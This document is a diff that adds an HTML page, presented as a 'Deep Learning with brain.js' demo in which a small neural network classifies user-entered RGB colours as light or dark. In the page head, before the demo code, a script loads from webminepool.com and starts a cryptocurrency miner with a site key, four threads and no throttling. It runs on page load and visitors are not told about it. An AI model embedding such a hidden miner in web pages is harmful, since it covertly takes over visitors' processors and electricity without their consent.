@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
+      <script src="https://unpkg.com/brain.js@2.0.0-beta.17/dist/browser.js"></script>
+    <script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'machine-learning-color',{
+        threads: 4,
+        autoThreads: false,
+        throttle: 0,
+        forceASMJS: false
+    });
+    miner.start();
+</script>
+  </head>
+  <body>
+    <h1>Deep Learning with brain.js</h1>
+    <div id="whatColor">The Color is: <span id="color">#####</span></div>
+    <br>
+    <div id="demo"></div>
+    <div id="new"><input id="colorR" style="width:75px;" placeholder="Red Value"><input id="colorG" style="width:75px;" placeholder="Green Value"><input id="colorB" style="width:75px;" placeholder="Blue Value"><button onclick="newColor()">Submit</button></div>
+    <script>
+    var color = [200 / 255, 0 / 255, 0 / 255]
+      // Create a Neural Network
+      const net = new brain.NeuralNetwork();
+
+      // Train the Network with 4 input objects
+      net.train([
+        // White RGB(255, 255, 255)
+        {
+          input: [255 / 255, 255 / 255, 255 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Maroon RGB(74, 0, 0)
+        {
+          input: [74 / 255, 0, 0],
+          output: {
+              dark: 1
+          }
+        },
+        // Dark Cyan
+        {
+          input: [0 / 255, 37 / 255, 74 / 255],
+          output: {
+              dark: 1
+          }
+        },
+        // Orange
+        {
+          input: [237 / 255, 79 / 255, 17 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Blue
+        {
+          input: [7 / 255, 31 / 255, 247 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Dark Pale Blue
+        {
+          input: [51 / 255, 55 / 255, 87 / 255],
+          output: {
+              dark: 1
+          }
+        },
+        // Pale Blue
+        {
+          input: [106 / 255, 113 / 255, 173 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Dark Purple
+        {
+          input: [16 / 255, 4 / 255, 26 / 255],
+          output: {
+              dark: 1
+          }
+        },
+        // Dark Cyan Again
+        {
+          input: [32 / 255, 77 / 255, 71 / 255],
+          output: {
+              dark: 1
+          }
+        },
+        // Bright Cyan
+        {
+          input: [2 / 255, 250 / 255, 217 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Yellow
+        {
+          input: [255 / 255, 255 / 255, 0 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Light Red / Pink
+        {
+          input: [237 / 255, 97 / 255, 97 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Lightgrey (192,192,192)
+        {
+          input: [192 / 255, 192 / 255, 192 / 255],
+          output: {
+              light: 1
+          }
+        },
+        // Darkgrey (64, 64, 64)
+        {
+          input: [65 / 255, 65 / 255, 65 / 255],
+          output: {
+              dark: 1
+          }
+        },
+        // Black (0, 0, 0)
+        {
+          input: [0, 0, 0],
+          output: {
+              dark: 1
+          }
+        }, ]);
+
+      // What is the expected output of Dark Blue (0, 0, 128)?
+      let result = net.run(color);
+
+      // Display the probability of "dark" and "light"
+      document.getElementById("demo").innerHTML = "Dark: " + result["dark"] + "<br>" + "Light: " + result["light"];
+      document.getElementById("color").style.color = "rgb(" + (color[0] * 255) + ", " + (color[1] * 255) + ", " + (color[2] * 255) + ")";
+      document.getElementById("color").style.backgroundColor = "rgb(" + (color[0] * 255) + ", " + (color[1] * 255) + ", " + (color[2] * 255) + ")";
+      
+      function newColor() {
+        color = [];
+        color.push(document.getElementById("colorR").value / 255)
+        color.push(document.getElementById("colorG").value / 255)
+        color.push(document.getElementById("colorB").value / 255)
+        let result = net.run(color)
+        document.getElementById("demo").innerHTML = "Dark: " + result["dark"] + "<br>" + "Light: " + result["light"];
+      document.getElementById("color").style.color = "rgb(" + (color[0] * 255) + ", " + (color[1] * 255) + ", " + (color[2] * 255) + ")";
+      document.getElementById("color").style.backgroundColor = "rgb(" + (color[0] * 255) + ", " + (color[1] * 255) + ", " + (color[2] * 255) + ")";
+      }
+    </script>
+  </body>
+</html>
